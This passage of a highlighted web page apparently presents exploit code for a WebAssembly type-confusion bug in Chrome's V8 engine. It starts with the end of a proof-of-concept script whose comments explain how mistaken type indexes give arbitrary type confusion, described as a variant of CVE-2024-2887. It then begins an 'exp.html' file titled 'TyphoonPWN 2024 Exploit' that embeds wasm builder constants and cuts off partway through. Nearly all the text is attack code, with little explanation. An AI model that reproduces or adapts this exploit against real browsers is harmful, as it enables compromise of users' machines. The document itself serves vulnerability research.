punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  builder    <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>      kExprLocalGet<span class="token punctuation">,</span>      <span class="token number">0</span><span class="token punctuation">,</span>      kGCPrefix<span class="token punctuation">,</span>      kExprStructGet<span class="token punctuation">,</span>      struct<span class="token punctuation">,</span>      <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> instance <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> wasm <span class="token operator">=</span> instance<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>  <span class="token comment">// this should obviously fail, instead of reading from the given JS object (or smi)</span>  <span class="token comment">// instead we segfault on the smi as caged offset</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// FromJS / WasmJSToWasmObject is mistaking canonicalized type indexes as normal type indexes.</span><span class="token comment">// This confusion also results in the value to be truncated to 20bits (= 0x100000 = 1048576) since</span><span class="token comment">//  ValueType is used to represent the type indexes, so we can even cycle back to 0 and create more</span><span class="token comment">//  types that are confused as kAny.</span><span class="token comment">// => Arbitrary WASM type confusion, variant of @_manfp's CVE-2024-2887 at Pwn2Own Vancouver 2024</span></code></pre><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- exp.html --></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>TyphoonPWN 2024 Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span>      <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span>      <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span>      <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>120<span class="token punctuation">"</span></span>      <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>        font-family: Consolas, Monaco, Lucida Console, Liberation Mono,          DejaVu Sans Mono, Bitstream Vera Sans Mono, Courier New, monospace;      <span class="token punctuation">"</span></span></span>    <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token comment">// Copyright 2016 the V8 project authors. All rights reserved.</span>      <span class="token comment">// Use of this source code is governed by a BSD-style license that can be</span>      <span class="token comment">// found in the LICENSE file.</span>      <span class="token comment">// Used for encoding f32 and double constants to bits.</span>      <span class="token keyword">let</span> byte_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>byte_view<span class="token punctuation">.</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// The bytes function receives one of</span>      <span class="token comment">//  - several arguments, each of which is either a number or a string of length</span>      <span class="token comment">//    1; if it's a string, the charcode of the contained character is used.</span>      <span class="token comment">//  - a single array argument containing the actual arguments</span>      <span class="token comment">//  - a single string; the returned buffer will contain the char codes of all</span>      <span class="token comment">//    contained characters.</span>      <span class="token keyword">function</span> <span class="token function">bytes</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"array"</span><span class="token punctuation">)</span> input <span class="token operator">=</span> input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> len <span class="token operator">=</span> input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>          <span class="token keyword">let</span> view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> view<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> view<span class="token punctuation">.</span>buffer<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">let</span> view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> input<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> val <span class="token operator">=</span> input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> val <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>val<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"string inputs must have length 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            val <span class="token operator">=</span> val<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          view<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> val <span class="token operator">|</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> view<span class="token punctuation">.</span>buffer<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Header declaration constants</span>      <span class="token keyword">var</span> kWasmH0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kWasmH1 <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kWasmH2 <span class="token operator">=</span> <span class="token number">0x73</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kWasmH3 <span class="token operator">=</span> <span class="token number">0x6d</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kWasmV0 <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kWasmV1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kWasmV2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kWasmV3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kHeaderSize <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kPageSize <span class="token operator">=</span> <span class="token number">65536</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kSpecMaxPages <span class="token operator">=</span> <span class="token number">65536</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kMaxVarInt32Size <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> kMaxVarInt64Size <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kDeclNoLocals <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment">// Section declaration constants</span>      <span class="token keyword">let</span> kUnknownSectionCode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTypeSectionCode <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// Function signature declarations</span>      <span class="token keyword">let</span> kImportSectionCode <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// Import declarations</span>      <span class="token keyword">let</span> kFunctionSectionCode <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">// Function declarations</span>      <span class="token keyword">let</span> kTableSectionCode <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment">// Indirect function table and other tables</span>      <span class="token keyword">let</span> kMemorySectionCode <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// Memory attributes</span>      <span class="token keyword">let</span> kGlobalSectionCode <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> <span class="token comment">// Global declarations</span>      <span class="token keyword">let</span> kExportSectionCode <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token comment">// Exports</span>      <span class="token keyword">let</span> kStartSectionCode <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token comment">// Start function declaration</span>      <span class="token keyword">let</span> kElementSectionCode <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token comment">// Elements section</span>      <span class="token keyword">let</span> kCodeSectionCode <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// Function code</span>      <span class="token keyword">let</span> kDataSectionCode <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token comment">// Data segments</span>      <span class="token keyword">let</span> kDataCountSectionCode <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span> <span class="token comment">// Data segment count (between Element &amp; Code)</span>      <span class="token keyword">let</span> kTagSectionCode <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token comment">// Tag section (between Memory &amp; Global)</span>      <span class="token keyword">let</span> kStringRefSectionCode <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span> <span class="token comment">// Stringref literals section (between Tag &amp; Global)</span>      <span class="token keyword">let</span> kLastKnownSectionCode <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span>      <span class="token comment">// Name section types</span>      <span class="token keyword">let</span> kModuleNameCode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kFunctionNamesCode <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kLocalNamesCode <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmFunctionTypeForm <span class="token operator">=</span> <span class="token number">0x60</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmStructTypeForm <span class="token operator">=</span> <span class="token number">0x5f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmArrayTypeForm <span class="token operator">=</span> <span class="token number">0x5e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmSubtypeForm <span class="token operator">=</span> <span class="token number">0x50</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmSubtypeFinalForm <span class="token operator">=</span> <span class="token number">0x4f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmRecursiveTypeGroupForm <span class="token operator">=</span> <span class="token number">0x4e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kNoSuperType <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kLimitsNoMaximum <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kLimitsWithMaximum <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kLimitsSharedNoMaximum <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kLimitsSharedWithMaximum <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kLimitsMemory64NoMaximum <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kLimitsMemory64WithMaximum <span class="token operator">=</span> <span class="token number">0x05</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kLimitsMemory64SharedNoMaximum <span class="token operator">=</span> <span class="token number">0x06</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kLimitsMemory64SharedWithMaximum <span class="token operator">=</span> <span class="token number">0x07</span><span class="token punctuation">;</span>      <span class="token comment">// Segment flags</span>      <span class="token keyword">let</span> kActiveNoIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kPassive <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kActiveWithIndex <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kDeclarative <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kPassiveWithElements <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kDeclarativeWithElements <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>      <span class="token comment">// Function declaration flags</span>      <span class="token keyword">let</span> kDeclFunctionName <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kDeclFunctionImport <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kDeclFunctionLocals <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kDeclFunctionExport <span class="token operator">=</span> <span class="token number">0x08</span><span class="token punctuation">;</span>      <span class="token comment">// Value types and related</span>      <span class="token keyword">let</span> kWasmVoid <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmI32 <span class="token operator">=</span> <span class="token number">0x7f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmI64 <span class="token operator">=</span> <span class="token number">0x7e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmF32 <span class="token operator">=</span> <span class="token number">0x7d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmF64 <span class="token operator">=</span> <span class="token number">0x7c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmS128 <span class="token operator">=</span> <span class="token number">0x7b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmI8 <span class="token operator">=</span> <span class="token number">0x78</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmI16 <span class="token operator">=</span> <span class="token number">0x77</span><span class="token punctuation">;</span>      <span class="token comment">// These are defined as negative integers to distinguish them from positive type</span>      <span class="token comment">// indices.</span>      <span class="token keyword">let</span> kWasmNullFuncRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x0d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmNullExternRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x0e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmNullRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x0f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmFuncRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmAnyFunc <span class="token operator">=</span> kWasmFuncRef<span class="token punctuation">;</span> <span class="token comment">// Alias named as in the JS API spec</span>      <span class="token keyword">let</span> kWasmExternRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x11</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmAnyRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x12</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmEqRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x13</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmI31Ref <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x14</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmStructRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x15</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmArrayRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x16</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmExnRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x17</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmStringRef <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x19</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmStringViewWtf8 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x1a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmStringViewWtf16 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x1e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmStringViewIter <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x1f</span><span class="token punctuation">;</span>      <span class="token comment">// Use the positive-byte versions inside function bodies.</span>      <span class="token keyword">let</span> kLeb128Mask <span class="token operator">=</span> <span class="token number">0x7f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kFuncRefCode <span class="token operator">=</span> kWasmFuncRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kAnyFuncCode <span class="token operator">=</span> kFuncRefCode<span class="token punctuation">;</span> <span class="token comment">// Alias named as in the JS API spec</span>      <span class="token keyword">let</span> kExternRefCode <span class="token operator">=</span> kWasmExternRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kAnyRefCode <span class="token operator">=</span> kWasmAnyRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kEqRefCode <span class="token operator">=</span> kWasmEqRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kI31RefCode <span class="token operator">=</span> kWasmI31Ref <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kNullExternRefCode <span class="token operator">=</span> kWasmNullExternRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kNullFuncRefCode <span class="token operator">=</span> kWasmNullFuncRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kStructRefCode <span class="token operator">=</span> kWasmStructRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kArrayRefCode <span class="token operator">=</span> kWasmArrayRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kExnRefCode <span class="token operator">=</span> kWasmExnRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kNullRefCode <span class="token operator">=</span> kWasmNullRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kStringRefCode <span class="token operator">=</span> kWasmStringRef <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kStringViewWtf8Code <span class="token operator">=</span> kWasmStringViewWtf8 <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kStringViewWtf16Code <span class="token operator">=</span> kWasmStringViewWtf16 <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kStringViewIterCode <span class="token operator">=</span> kWasmStringViewIter <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmRefNull <span class="token operator">=</span> <span class="token number">0x63</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kWasmRef <span class="token operator">=</span> <span class="token number">0x64</span><span class="token punctuation">;</span>      <span class="token keyword">function</span> <span class="token function">wasmRefNullType</span><span class="token punctuation">(</span><span class="token parameter">heap_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">opcode</span><span class="token operator">:</span> kWasmRefNull<span class="token punctuation">,</span> <span class="token literal-property property">heap_type</span><span class="token operator">:</span> heap_type <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">wasmRefType</span><span class="token punctuation">(</span><span class="token parameter">heap_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">opcode</span><span class="token operator">:</span> kWasmRef<span class="token punctuation">,</span> <span class="token literal-property property">heap_type</span><span class="token operator">:</span> heap_type <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">let</span> kExternalFunction <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExternalTable <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExternalMemory <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExternalGlobal <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExternalTag <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kTableZero <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kMemoryZero <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSegmentZero <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExceptionAttribute <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment">// Useful signatures</span>      <span class="token keyword">let</span> kSig_i_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_l_l <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_i_l <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_i_ii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_i_iii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_v_iiii <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_l_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_f_ff <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF32<span class="token punctuation">,</span> kWasmF32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_d_dd <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmF64<span class="token punctuation">,</span> kWasmF64<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmF64<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kSig_l_ll <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI64<span class="token punctuation">,</span> kWasmI64<span class="token punctuation">]</span><span class="token 